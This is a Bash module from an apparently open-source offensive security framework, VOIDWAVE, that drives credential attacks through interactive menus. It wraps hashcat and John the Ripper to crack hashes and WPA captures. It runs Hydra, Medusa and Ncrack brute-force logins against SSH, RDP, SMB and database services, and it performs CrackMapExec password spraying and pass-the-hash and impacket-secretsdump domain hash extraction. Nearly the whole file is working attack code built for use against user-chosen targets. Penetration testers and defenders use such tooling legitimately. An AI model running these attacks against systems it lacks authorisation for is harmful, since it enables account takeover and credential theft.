#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════════════════
# VOIDWAVE - Offensive Security Framework
# ═══════════════════════════════════════════════════════════════════════════════
# Copyright (c) 2025 Nerds489
# SPDX-License-Identifier: Apache-2.0
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at:
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# See LICENSE and NOTICE files in the project root for full details.
# ═══════════════════════════════════════════════════════════════════════════════
#
# Credentials module: hash cracking, brute force, password attacks
# ═══════════════════════════════════════════════════════════════════════════════

# Prevent multiple sourcing
[[ -n "${_VOIDWAVE_CREDENTIALS_LOADED:-}" ]] && return 0
readonly _VOIDWAVE_CREDENTIALS_LOADED=1

# Source library files
source "${BASH_SOURCE%/*}/../lib/core.sh"
source "${BASH_SOURCE%/*}/../lib/ui.sh"
source "${BASH_SOURCE%/*}/../lib/utils.sh"
source "${BASH_SOURCE%/*}/../lib/detection.sh"

#═══════════════════════════════════════════════════════════════════════════════
# DEFAULT CONFIGURATION
#═══════════════════════════════════════════════════════════════════════════════

# Default wordlist path
readonly DEFAULT_WORDLIST="${DEFAULT_WORDLIST:-/usr/share/wordlists/rockyou.txt}"
readonly DEFAULT_HASHCAT_RULES="/usr/share/hashcat/rules/best64.rule"

#═══════════════════════════════════════════════════════════════════════════════
# HASHCAT FUNCTIONS
#═══════════════════════════════════════════════════════════════════════════════

# Convert capture file to hashcat format
# Args: $1 = capture file (optional, will prompt if not provided)
# Returns: path to converted file
convert_to_hashcat() {
    local capfile="$1"
    local converter=""

    # Detect available converter
    if command -v hcxpcapngtool &>/dev/null; then
        converter="hcxpcapngtool"
    elif command -v cap2hccapx &>/dev/null; then
        converter="cap2hccapx"
    fi

    if [[ -z "$converter" ]]; then
        log_error "hcxpcapngtool or cap2hccapx required"
        echo -e "    ${C_SHADOW}Install: apt install hcxtools${C_RESET}"
        return 1
    fi

    # Get capture file if not provided
    if [[ -z "$capfile" ]]; then
        get_target_input "Capture file (.cap/.pcapng): " capfile
    fi

    if [[ ! -f "$capfile" ]]; then
        log_error "File not found: $capfile"
        return 1
    fi

    # Generate output filename
    local out_file="${LOOT_DIR:-/tmp}/$(basename "${capfile%.*}")_$(timestamp_filename).hc22000"

    operation_header "Convert to Hashcat" "$capfile"
    local start_ms=$(date +%s)

    if [[ "$converter" == "hcxpcapngtool" ]]; then
        log_info "Converting with hcxpcapngtool"
        log_command_preview "hcxpcapngtool -o \"${out_file}\" \"${capfile}\""
        hcxpcapngtool -o "$out_file" "$capfile"
    else
        log_info "Converting with cap2hccapx"
        log_command_preview "cap2hccapx \"${capfile}\" \"${out_file}\""
        cap2hccapx "$capfile" "$out_file"
    fi

    local duration=$(elapsed_time "$start_ms")

    if [[ -f "$out_file" ]]; then
        log_loot "Hashcat file: $out_file"
        operation_summary "success" "Convert" "Output: $out_file"
        echo "$out_file"
        return 0
    else
        log_error "Conversion failed"
        return 1
    fi
}

# Run hashcat with GPU acceleration
# Args: $1 = hash file (optional), $2 = wordlist (optional)
run_hashcat_gpu() {
    check_tool "hashcat" || return 1

    local hashfile="$1"
    local wordlist="${2:-$DEFAULT_WORDLIST}"

    # Get hash file if not provided
    if [[ -z "$hashfile" ]]; then
        get_target_input "Hash file or capture (.cap/.hc22000): " hashfile
    fi

    if [[ ! -f "$hashfile" ]]; then
        log_error "File not found: $hashfile"
        return 1
    fi

    # Convert if it's a capture file
    if [[ "$hashfile" =~ \.(cap|pcap|pcapng)$ ]]; then
        hashfile=$(convert_to_hashcat "$hashfile" | tail -n 1)
        [[ -z "$hashfile" ]] && return 1
    fi

    # Get wordlist
    if [[ ! -f "$wordlist" ]]; then
        get_target_input "Wordlist path: " wordlist
    fi

    if [[ ! -f "$wordlist" ]]; then
        log_error "Wordlist not found: $wordlist"
        return 1
    fi

    operation_header "Hashcat GPU" "$hashfile"
    local start_ms=$(date +%s)

    log_audit "CREDENTIAL_ATTACK" "hashcat_gpu" "$hashfile"
    log_attack "Hashcat GPU attack on $hashfile"

    local potfile="${LOG_DIR:-/tmp}/hashcat.pot"
    local logfile="${LOG_DIR:-/tmp}/hashcat.log"

    log_command_preview "hashcat -m 22000 -a 0 \"${hashfile}\" \"${wordlist}\" --status --status-timer=15 --potfile-path \"${potfile}\" --session voidwave"
    hashcat -m 22000 -a 0 "$hashfile" "$wordlist" \
        --status --status-timer=15 \
        --potfile-path "$potfile" \
        --session voidwave 2>&1 | tee -a "$logfile"

    # Show cracked passwords
    echo ""
    log_info "Checking for cracked passwords..."
    hashcat --show -m 22000 "$hashfile" --potfile-path "$potfile" 2>&1 | tee -a "$logfile"

    local duration=$(elapsed_time "$start_ms")
    log_loot "Results: $logfile"
    operation_summary "success" "Hashcat GPU" "Duration: $duration"
}

# Run hashcat with rule-based attack
# Args: $1 = hash file (optional), $2 = wordlist (optional), $3 = rules file (optional)
run_hashcat_rules() {
    check_tool "hashcat" || return 1

    local hashfile="$1"
    local wordlist="${2:-$DEFAULT_WORDLIST}"
    local rules="${3:-$DEFAULT_HASHCAT_RULES}"

    # Get hash file if not provided
    if [[ -z "$hashfile" ]]; then
        get_target_input "Hash file or capture (.cap/.hc22000): " hashfile
    fi

    if [[ ! -f "$hashfile" ]]; then
        log_error "File not found: $hashfile"
        return 1
    fi

    # Convert if it's a capture file
    if [[ "$hashfile" =~ \.(cap|pcap|pcapng)$ ]]; then
        hashfile=$(convert_to_hashcat "$hashfile" | tail -n 1)
        [[ -z "$hashfile" ]] && return 1
    fi

    # Get wordlist
    if [[ ! -f "$wordlist" ]]; then
        get_target_input "Wordlist path: " wordlist
    fi

    # Get rules file
    if [[ ! -f "$rules" ]]; then
        get_target_input "Rules file [$DEFAULT_HASHCAT_RULES]: " rules
        rules="${rules:-$DEFAULT_HASHCAT_RULES}"
    fi

    operation_header "Hashcat Rules" "$hashfile"
    local start_ms=$(date +%s)

    log_audit "CREDENTIAL_ATTACK" "hashcat_rules" "$hashfile"
    log_attack "Hashcat rules attack on $hashfile using $rules"

    local potfile="${LOG_DIR:-/tmp}/hashcat.pot"
    local logfile="${LOG_DIR:-/tmp}/hashcat.log"

    log_command_preview "hashcat -m 22000 -a 0 \"${hashfile}\" \"${wordlist}\" -r \"${rules}\" --status --status-timer=15 --potfile-path \"${potfile}\" --session voidwave"
    hashcat -m 22000 -a 0 "$hashfile" "$wordlist" -r "$rules" \
        --status --status-timer=15 \
        --potfile-path "$potfile" \
        --session voidwave 2>&1 | tee -a "$logfile"

    # Show cracked passwords
    echo ""
    log_info "Checking for cracked passwords..."
    hashcat --show -m 22000 "$hashfile" --potfile-path "$potfile" 2>&1 | tee -a "$logfile"

    local duration=$(elapsed_time "$start_ms")
    log_loot "Results: $logfile"
    operation_summary "success" "Hashcat Rules" "Duration: $duration"
}

# Run hashcat with custom hash type
# Args: $1 = hash type, $2 = hash file, $3 = wordlist
run_hashcat_custom() {
    check_tool "hashcat" || return 1

    local hash_type="$1"
    local hashfile="$2"
    local wordlist="${3:-$DEFAULT_WORDLIST}"

    # Get hash type if not provided
    if [[ -z "$hash_type" ]]; then
        echo -e "\n    ${C_CYAN}Common hash types:${C_RESET}"
        echo -e "    ${C_SHADOW}0     - MD5${C_RESET}"
        echo -e "    ${C_SHADOW}100   - SHA1${C_RESET}"
        echo -e "    ${C_SHADOW}1400  - SHA256${C_RESET}"
        echo -e "    ${C_SHADOW}1800  - SHA512crypt${C_RESET}"
        echo -e "    ${C_SHADOW}3200  - bcrypt${C_RESET}"
        echo -e "    ${C_SHADOW}5600  - NetNTLMv2${C_RESET}"
        echo -e "    ${C_SHADOW}13100 - Kerberos TGS-REP${C_RESET}"
        echo -e "    ${C_SHADOW}22000 - WPA-PBKDF2-PMKID+EAPOL${C_RESET}"
        echo ""
        get_target_input "Hash type (-m): " hash_type
    fi

    # Get hash file if not provided
    if [[ -z "$hashfile" ]]; then
        get_target_input "Hash file: " hashfile
    fi

    if [[ ! -f "$hashfile" ]]; then
        log_error "File not found: $hashfile"
        return 1
    fi

    # Get wordlist
    if [[ ! -f "$wordlist" ]]; then
        get_target_input "Wordlist path: " wordlist
    fi

    operation_header "Hashcat Custom" "Type $hash_type on $hashfile"
    local start_ms=$(date +%s)

    log_audit "CREDENTIAL_ATTACK" "hashcat_custom" "$hashfile (type: $hash_type)"

    local potfile="${LOG_DIR:-/tmp}/hashcat.pot"
    local logfile="${LOG_DIR:-/tmp}/hashcat.log"

    log_command_preview "hashcat -m ${hash_type} -a 0 \"${hashfile}\" \"${wordlist}\" --status --potfile-path \"${potfile}\""
    hashcat -m "$hash_type" -a 0 "$hashfile" "$wordlist" \
        --status \
        --potfile-path "$potfile" 2>&1 | tee -a "$logfile"

    # Show cracked passwords
    echo ""
    log_info "Checking for cracked passwords..."
    hashcat --show -m "$hash_type" "$hashfile" --potfile-path "$potfile" 2>&1 | tee -a "$logfile"

    local duration=$(elapsed_time "$start_ms")
    log_loot "Results: $logfile"
    operation_summary "success" "Hashcat Custom" "Duration: $duration"
}

#═══════════════════════════════════════════════════════════════════════════════
# JOHN THE RIPPER FUNCTIONS
#═══════════════════════════════════════════════════════════════════════════════

# Run John the Ripper on hash file
# Args: $1 = hash file (optional), $2 = wordlist (optional)
run_john() {
    check_tool "john" || return 1

    local hashfile="$1"
    local wordlist="${2:-$DEFAULT_WORDLIST}"

    # Get hash file if not provided
    if [[ -z "$hashfile" ]]; then
        get_target_input "Hash file: " hashfile
    fi

    if [[ ! -f "$hashfile" ]]; then
        log_error "File not found: $hashfile"
        return 1
    fi

    # Get wordlist
    if [[ ! -f "$wordlist" ]]; then
        get_target_input "Wordlist path: " wordlist
    fi

    operation_header "John the Ripper" "$hashfile"
    local start_ms=$(date +%s)

    log_audit "CREDENTIAL_ATTACK" "john" "$hashfile"
    log_attack "John the Ripper on $hashfile"

    local logfile="${LOG_DIR:-/tmp}/john.log"

    log_command_preview "john --wordlist=\"${wordlist}\" \"${hashfile}\""
    john --wordlist="$wordlist" "$hashfile" 2>&1 | tee -a "$logfile"

    # Show cracked passwords
    echo ""
    log_info "Cracked passwords:"
    john --show "$hashfile" 2>&1 | tee -a "$logfile"

    local duration=$(elapsed_time "$start_ms")
    log_loot "Results: $logfile"
    operation_summary "success" "John the Ripper" "Duration: $duration"
}

# Run John on WiFi capture file
# Args: $1 = capture file (optional), $2 = wordlist (optional)
run_john_wifi() {
    check_tool "john" || return 1
    check_tool "hccap2john" || {
        log_error "hccap2john required (part of john package)"
        return 1
    }

    local capfile="$1"
    local wordlist="${2:-$DEFAULT_WORDLIST}"

    # Get capture file if not provided
    if [[ -z "$capfile" ]]; then
        get_target_input "Capture file (.cap/.pcapng): " capfile
    fi

    if [[ ! -f "$capfile" ]]; then
        log_error "File not found: $capfile"
        return 1
    fi

    # Get wordlist
    if [[ ! -f "$wordlist" ]]; then
        get_target_input "Wordlist path: " wordlist
    fi

    operation_header "John WiFi" "$capfile"
    local start_ms=$(date +%s)

    # Convert capture to john format
    local john_hash="${LOOT_DIR:-/tmp}/john_$(timestamp_filename).hash"
    log_info "Converting capture to John format..."
    hccap2john "$capfile" > "$john_hash"

    log_audit "CREDENTIAL_ATTACK" "john_wifi" "$capfile"
    log_attack "John the Ripper on $john_hash"

    local logfile="${LOG_DIR:-/tmp}/john.log"

    log_command_preview "john --wordlist=\"${wordlist}\" \"${john_hash}\""
    john --wordlist="$wordlist" "$john_hash" 2>&1 | tee -a "$logfile"

    # Show cracked passwords
    echo ""
    log_info "Cracked passwords:"
    john --show "$john_hash" 2>&1 | tee -a "$logfile"

    local duration=$(elapsed_time "$start_ms")
    log_loot "Hash file: $john_hash"
    log_loot "Results: $logfile"
    operation_summary "success" "John WiFi" "Duration: $duration"
}

#═══════════════════════════════════════════════════════════════════════════════
# HYDRA FUNCTIONS
#═══════════════════════════════════════════════════════════════════════════════

# Run Hydra brute force attack
# Args: $1 = target (optional)
run_hydra() {
    check_tool "hydra" || return 1

    local target="$1"

    # Get target if not provided
    if [[ -z "$target" ]]; then
        get_target_input "Target (IP/hostname): " target
    fi

    # Service selection
    echo -e "\n    ${C_CYAN}Select service:${C_RESET}"
    echo -e "    ${C_GHOST}[1]${C_RESET} SSH"
    echo -e "    ${C_GHOST}[2]${C_RESET} FTP"
    echo -e "    ${C_GHOST}[3]${C_RESET} HTTP-POST-FORM"
    echo -e "    ${C_GHOST}[4]${C_RESET} HTTP-GET"
    echo -e "    ${C_GHOST}[5]${C_RESET} SMB"
    echo -e "    ${C_GHOST}[6]${C_RESET} RDP"
    echo -e "    ${C_GHOST}[7]${C_RESET} MySQL"
    echo -e "    ${C_GHOST}[8]${C_RESET} PostgreSQL"
    echo -e "    ${C_GHOST}[9]${C_RESET} Custom"
    echo ""

    local choice service port
    get_target_input "Choice [1-9]: " choice

    case "$choice" in
        1) service="ssh"; port="22" ;;
        2) service="ftp"; port="21" ;;
        3) service="http-post-form"; port="80" ;;
        4) service="http-get"; port="80" ;;
        5) service="smb"; port="445" ;;
        6) service="rdp"; port="3389" ;;
        7) service="mysql"; port="3306" ;;
        8) service="postgres"; port="5432" ;;
        9)
            get_target_input "Service name: " service
            get_target_input "Port: " port
            ;;
        *) log_error "Invalid choice"; return 1 ;;
    esac

    # Get credentials
    local username userlist passlist
    echo -e "\n    ${C_CYAN}Credential options:${C_RESET}"
    echo -e "    ${C_GHOST}[1]${C_RESET} Single username + wordlist"
    echo -e "    ${C_GHOST}[2]${C_RESET} Username list + wordlist"
    echo ""

    get_target_input "Choice [1-2]: " choice

    local args=()
    case "$choice" in
        1)
            get_target_input "Username: " username
            get_target_input "Password wordlist: " passlist
            args+=("-l" "$username" "-P" "$passlist")
            ;;
        2)
            get_target_input "Username wordlist: " userlist
            get_target_input "Password wordlist: " passlist
            args+=("-L" "$userlist" "-P" "$passlist")
            ;;
        *) log_error "Invalid choice"; return 1 ;;
    esac

    # Add target and service
    args+=("-s" "$port" "$target" "$service")

    # HTTP form handling
    if [[ "$service" == "http-post-form" ]]; then
        local form_path form_params
        get_target_input "Login page path (e.g., /login.php): " form_path
        get_target_input "Form params (e.g., user=^USER^&pass=^PASS^:F=failed): " form_params
        args+=("${form_path}:${form_params}")
    fi

    operation_header "Hydra" "$target ($service)"
    local start_ms=$(date +%s)

    log_audit "CREDENTIAL_ATTACK" "hydra" "$target:$port ($service)"
    log_attack "Hydra attack on $target ($service)"

    local outfile="${OUTPUT_DIR:-/tmp}/hydra_$(timestamp_filename).txt"

    log_command_preview "hydra ${args[*]} -o \"${outfile}\""
    hydra "${args[@]}" -o "$outfile" 2>&1 | tee -a "${LOG_DIR:-/tmp}/hydra.log"

    local duration=$(elapsed_time "$start_ms")
    log_loot "Results saved: $outfile"
    operation_summary "success" "Hydra" "Duration: $duration"
}

# Run Hydra SSH attack (quick helper)
# Args: $1 = target, $2 = username, $3 = wordlist
run_hydra_ssh() {
    check_tool "hydra" || return 1

    local target="$1"
    local username="$2"
    local wordlist="${3:-$DEFAULT_WORDLIST}"

    if [[ -z "$target" ]]; then
        get_target_input "Target (IP/hostname): " target
    fi

    if [[ -z "$username" ]]; then
        get_target_input "Username: " username
    fi

    if [[ ! -f "$wordlist" ]]; then
        get_target_input "Password wordlist: " wordlist
    fi

    operation_header "Hydra SSH" "$target"
    local start_ms=$(date +%s)

    log_audit "CREDENTIAL_ATTACK" "hydra_ssh" "$target"
    log_attack "Hydra SSH attack on $target as $username"

    local outfile="${OUTPUT_DIR:-/tmp}/hydra_ssh_$(timestamp_filename).txt"

    log_command_preview "hydra -l \"${username}\" -P \"${wordlist}\" ${target} ssh -o \"${outfile}\""
    hydra -l "$username" -P "$wordlist" "$target" ssh -o "$outfile" 2>&1 | tee -a "${LOG_DIR:-/tmp}/hydra.log"

    local duration=$(elapsed_time "$start_ms")
    log_loot "Results saved: $outfile"
    operation_summary "success" "Hydra SSH" "Duration: $duration"
}

#═══════════════════════════════════════════════════════════════════════════════
# MEDUSA FUNCTIONS
#═══════════════════════════════════════════════════════════════════════════════

# Run Medusa parallel brute force
# Args: $1 = target (optional)
run_medusa() {
    check_tool "medusa" || return 1

    local target="$1"

    # Get target if not provided
    if [[ -z "$target" ]]; then
        get_target_input "Target (IP/hostname): " target
    fi

    # Module selection
    echo -e "\n    ${C_CYAN}Select module:${C_RESET}"
    echo -e "    ${C_GHOST}[1]${C_RESET} SSH"
    echo -e "    ${C_GHOST}[2]${C_RESET} FTP"
    echo -e "    ${C_GHOST}[3]${C_RESET} HTTP"
    echo -e "    ${C_GHOST}[4]${C_RESET} SMB"
    echo -e "    ${C_GHOST}[5]${C_RESET} MySQL"
    echo -e "    ${C_GHOST}[6]${C_RESET} PostgreSQL"
    echo -e "    ${C_GHOST}[7]${C_RESET} MSSQL"
    echo -e "    ${C_GHOST}[8]${C_RESET} VNC"
    echo -e "    ${C_GHOST}[9]${C_RESET} Custom"
    echo ""

    local choice module
    get_target_input "Choice [1-9]: " choice

    case "$choice" in
        1) module="ssh" ;;
        2) module="ftp" ;;
        3) module="http" ;;
        4) module="smbnt" ;;
        5) module="mysql" ;;
        6) module="postgres" ;;
        7) module="mssql" ;;
        8) module="vnc" ;;
        9) get_target_input "Module name: " module ;;
        *) log_error "Invalid choice"; return 1 ;;
    esac

    # Get credentials
    local username userlist passlist
    echo -e "\n    ${C_CYAN}Credential options:${C_RESET}"
    echo -e "    ${C_GHOST}[1]${C_RESET} Single username + wordlist"
    echo -e "    ${C_GHOST}[2]${C_RESET} Username list + wordlist"
    echo ""

    get_target_input "Choice [1-2]: " choice

    local args=("-h" "$target" "-M" "$module")
    case "$choice" in
        1)
            get_target_input "Username: " username
            get_target_input "Password wordlist: " passlist
            args+=("-u" "$username" "-P" "$passlist")
            ;;
        2)
            get_target_input "Username wordlist: " userlist
            get_target_input "Password wordlist: " passlist
            args+=("-U" "$userlist" "-P" "$passlist")
            ;;
        *) log_error "Invalid choice"; return 1 ;;
    esac

    operation_header "Medusa" "$target ($module)"
    local start_ms=$(date +%s)

    log_audit "CREDENTIAL_ATTACK" "medusa" "$target ($module)"
    log_attack "Medusa attack on $target ($module)"

    log_command_preview "medusa ${args[*]}"
    medusa "${args[@]}" 2>&1 | tee -a "${LOG_DIR:-/tmp}/medusa.log"

    local duration=$(elapsed_time "$start_ms")
    log_loot "Results: ${LOG_DIR:-/tmp}/medusa.log"
    operation_summary "success" "Medusa" "Duration: $duration"
}

#═══════════════════════════════════════════════════════════════════════════════
# CRACKMAPEXEC FUNCTIONS
#═══════════════════════════════════════════════════════════════════════════════

# Run CrackMapExec for AD/SMB attacks
# Args: $1 = target (optional)
run_crackmapexec() {
    check_tool "crackmapexec" || return 1

    local target="$1"

    # Get target if not provided
    if [[ -z "$target" ]]; then
        get_target_input "Target (IP/range/hostname): " target
    fi

    # Protocol selection
    echo -e "\n    ${C_CYAN}Select protocol:${C_RESET}"
    echo -e "    ${C_GHOST}[1]${C_RESET} SMB"
    echo -e "    ${C_GHOST}[2]${C_RESET} WinRM"
    echo -e "    ${C_GHOST}[3]${C_RESET} LDAP"
    echo -e "    ${C_GHOST}[4]${C_RESET} MSSQL"
    echo -e "    ${C_GHOST}[5]${C_RESET} SSH"
    echo ""

    local choice protocol
    get_target_input "Choice [1-5]: " choice

    case "$choice" in
        1) protocol="smb" ;;
        2) protocol="winrm" ;;
        3) protocol="ldap" ;;
        4) protocol="mssql" ;;
        5) protocol="ssh" ;;
        *) log_error "Invalid choice"; return 1 ;;
    esac

    # Authentication method
    echo -e "\n    ${C_CYAN}Authentication method:${C_RESET}"
    echo -e "    ${C_GHOST}[1]${C_RESET} Username + Password"
    echo -e "    ${C_GHOST}[2]${C_RESET} Username + Hash (pass-the-hash)"
    echo -e "    ${C_GHOST}[3]${C_RESET} Password spray (single password, user list)"
    echo -e "    ${C_GHOST}[4]${C_RESET} No auth (enum only)"
    echo ""

    get_target_input "Choice [1-4]: " choice

    local args=("$protocol" "$target")
    case "$choice" in
        1)
            local username password
            get_target_input "Username: " username
            get_target_input "Password: " password
            args+=("-u" "$username" "-p" "$password")
            ;;
        2)
            local username hash
            get_target_input "Username: " username
            get_target_input "NTLM hash: " hash
            args+=("-u" "$username" "-H" "$hash")
            ;;
        3)
            local userlist password
            get_target_input "Username wordlist: " userlist
            get_target_input "Password to spray: " password
            args+=("-u" "$userlist" "-p" "$password")
            ;;
        4)
            # No auth, just enum
            ;;
        *) log_error "Invalid choice"; return 1 ;;
    esac

    operation_header "CrackMapExec" "$target ($protocol)"
    local start_ms=$(date +%s)

    log_audit "CREDENTIAL_ATTACK" "crackmapexec" "$target ($protocol)"
    log_attack "CrackMapExec on $target ($protocol)"

    log_command_preview "crackmapexec ${args[*]}"
    crackmapexec "${args[@]}" 2>&1 | tee -a "${LOG_DIR:-/tmp}/cme.log"

    local duration=$(elapsed_time "$start_ms")
    log_loot "Results: ${LOG_DIR:-/tmp}/cme.log"
    operation_summary "success" "CrackMapExec" "Duration: $duration"
}

# CrackMapExec SMB enumeration
# Args: $1 = target (optional)
run_cme_enum() {
    check_tool "crackmapexec" || return 1

    local target="$1"

    if [[ -z "$target" ]]; then
        get_target_input "Target (IP/range): " target
    fi

    operation_header "CME Enumeration" "$target"
    local start_ms=$(date +%s)

    log_audit "RECON" "cme_enum" "$target"

    echo -e "\n    ${C_CYAN}Running SMB enumeration...${C_RESET}"
    log_command_preview "crackmapexec smb ${target}"
    crackmapexec smb "$target" 2>&1 | tee -a "${LOG_DIR:-/tmp}/cme.log"

    local duration=$(elapsed_time "$start_ms")
    log_loot "Results: ${LOG_DIR:-/tmp}/cme.log"
    operation_summary "success" "CME Enum" "Duration: $duration"
}

#═══════════════════════════════════════════════════════════════════════════════
# ADDITIONAL CREDENTIAL TOOLS
#═══════════════════════════════════════════════════════════════════════════════

# Run Ncrack for network authentication cracking
# Args: $1 = target (optional)
run_ncrack() {
    check_tool "ncrack" || return 1

    local target="$1"

    if [[ -z "$target" ]]; then
        get_target_input "Target (IP/hostname): " target
    fi

    # Service selection
    echo -e "\n    ${C_CYAN}Select service:${C_RESET}"
    echo -e "    ${C_GHOST}[1]${C_RESET} SSH"
    echo -e "    ${C_GHOST}[2]${C_RESET} FTP"
    echo -e "    ${C_GHOST}[3]${C_RESET} RDP"
    echo -e "    ${C_GHOST}[4]${C_RESET} SMB"
    echo -e "    ${C_GHOST}[5]${C_RESET} Telnet"
    echo ""

    local choice service
    get_target_input "Choice [1-5]: " choice

    case "$choice" in
        1) service="ssh" ;;
        2) service="ftp" ;;
        3) service="rdp" ;;
        4) service="smb" ;;
        5) service="telnet" ;;
        *) log_error "Invalid choice"; return 1 ;;
    esac

    local username passlist
    get_target_input "Username: " username
    get_target_input "Password wordlist: " passlist

    operation_header "Ncrack" "$target ($service)"
    local start_ms=$(date +%s)

    log_audit "CREDENTIAL_ATTACK" "ncrack" "$target ($service)"
    log_attack "Ncrack attack on $target ($service)"

    local outfile="${OUTPUT_DIR:-/tmp}/ncrack_$(timestamp_filename).txt"

    log_command_preview "ncrack -v --user ${username} -P ${passlist} ${target}:${service} -oA ${outfile}"
    ncrack -v --user "$username" -P "$passlist" "${target}:${service}" -oA "$outfile" 2>&1 | tee -a "${LOG_DIR:-/tmp}/ncrack.log"

    local duration=$(elapsed_time "$start_ms")
    log_loot "Results saved: $outfile"
    operation_summary "success" "Ncrack" "Duration: $duration"
}

# Extract hashes using impacket-secretsdump
# Args: $1 = target (optional)
run_secretsdump() {
    check_tool "impacket-secretsdump" || check_tool "secretsdump.py" || {
        log_error "impacket-secretsdump not found"
        echo -e "    ${C_SHADOW}Install: apt install python3-impacket${C_RESET}"
        return 1
    }

    local target="$1"

    if [[ -z "$target" ]]; then
        get_target_input "Target (IP/hostname): " target
    fi

    local domain username password
    get_target_input "Domain (or .): " domain
    get_target_input "Username: " username
    get_target_input "Password: " password

    operation_header "Secretsdump" "$target"
    local start_ms=$(date +%s)

    log_audit "CREDENTIAL_ATTACK" "secretsdump" "$target"
    log_attack "Secretsdump on $target"

    local outfile="${LOOT_DIR:-/tmp}/secretsdump_$(timestamp_filename).txt"
    local cmd

    if command -v impacket-secretsdump &>/dev/null; then
        cmd="impacket-secretsdump"
    else
        cmd="secretsdump.py"
    fi

    log_command_preview "${cmd} ${domain}/${username}:${password}@${target}"
    $cmd "${domain}/${username}:${password}@${target}" 2>&1 | tee "$outfile"

    local duration=$(elapsed_time "$start_ms")
    log_loot "Results saved: $outfile"
    operation_summary "success" "Secretsdump" "Duration: $duration"
}

#═══════════════════════════════════════════════════════════════════════════════
# CREDENTIALS MENU
#═══════════════════════════════════════════════════════════════════════════════

# Main credentials menu
credentials_menu() {
    while true; do
        clear
        echo -e "\n"
        echo -e "    ${C_SKULL}╭──────────────────────────────────────────────────────────────────╮${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}                    ${C_FIRE}🔑 CREDENTIAL ATTACKS${C_RESET}                       ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}╰──────────────────────────────────────────────────────────────────╯${C_RESET}"
        echo ""
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_CYAN}OFFLINE CRACKING${C_RESET}                                              ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[1]${C_RESET} Hashcat (GPU)            ${C_SHADOW}High-speed GPU cracking${C_RESET}         ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[2]${C_RESET} Hashcat (Rules)          ${C_SHADOW}Rule-based attacks${C_RESET}              ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[3]${C_RESET} Hashcat (Custom)         ${C_SHADOW}Custom hash type${C_RESET}                ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[4]${C_RESET} John the Ripper          ${C_SHADOW}CPU-based cracking${C_RESET}              ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[5]${C_RESET} John (WiFi)              ${C_SHADOW}Crack WPA handshakes${C_RESET}            ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[6]${C_RESET} Convert to Hashcat       ${C_SHADOW}cap → hc22000${C_RESET}                   ${C_SKULL}│${C_RESET}"
        echo ""
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_CYAN}ONLINE ATTACKS${C_RESET}                                                ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[7]${C_RESET} Hydra                    ${C_SHADOW}Network login brute force${C_RESET}       ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[8]${C_RESET} Hydra (SSH)              ${C_SHADOW}Quick SSH attack${C_RESET}                ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[9]${C_RESET} Medusa                   ${C_SHADOW}Parallel login attacks${C_RESET}          ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[10]${C_RESET} Ncrack                  ${C_SHADOW}High-speed auth cracking${C_RESET}        ${C_SKULL}│${C_RESET}"
        echo ""
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_CYAN}ACTIVE DIRECTORY${C_RESET}                                              ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[11]${C_RESET} CrackMapExec            ${C_SHADOW}AD/SMB spray & enum${C_RESET}             ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[12]${C_RESET} CME Enumeration         ${C_SHADOW}SMB enumeration only${C_RESET}            ${C_SKULL}│${C_RESET}"
        echo -e "    ${C_SKULL}│${C_RESET}  ${C_GHOST}[13]${C_RESET} Secretsdump             ${C_SHADOW}Extract domain hashes${C_RESET}           ${C_SKULL}│${C_RESET}"
        echo ""
        echo -e "    ${C_GHOST}[0]${C_RESET} Back"
        echo ""

        local choice
        get_target_input "Select option: " choice

        case "$choice" in
            1) run_hashcat_gpu ;;
            2) run_hashcat_rules ;;
            3) run_hashcat_custom ;;
            4) run_john ;;
            5) run_john_wifi ;;
            6) convert_to_hashcat ;;
            7) run_hydra ;;
            8) run_hydra_ssh ;;
            9) run_medusa ;;
            10) run_ncrack ;;
            11) run_crackmapexec ;;
            12) run_cme_enum ;;
            13) run_secretsdump ;;
            0|q|Q|back|exit) return 0 ;;
            *) log_warning "Invalid option" ;;
        esac

        echo ""
        read -rp "    Press Enter to continue..."
    done
}

#═══════════════════════════════════════════════════════════════════════════════
# EXPORT FUNCTIONS
#═══════════════════════════════════════════════════════════════════════════════

# Hashcat functions
export -f convert_to_hashcat run_hashcat_gpu run_hashcat_rules run_hashcat_custom

# John functions
export -f run_john run_john_wifi

# Hydra functions
export -f run_hydra run_hydra_ssh

# Medusa functions
export -f run_medusa

# CrackMapExec functions
export -f run_crackmapexec run_cme_enum

# Additional functions
export -f run_ncrack run_secretsdump

# Menu
export -f credentials_menu
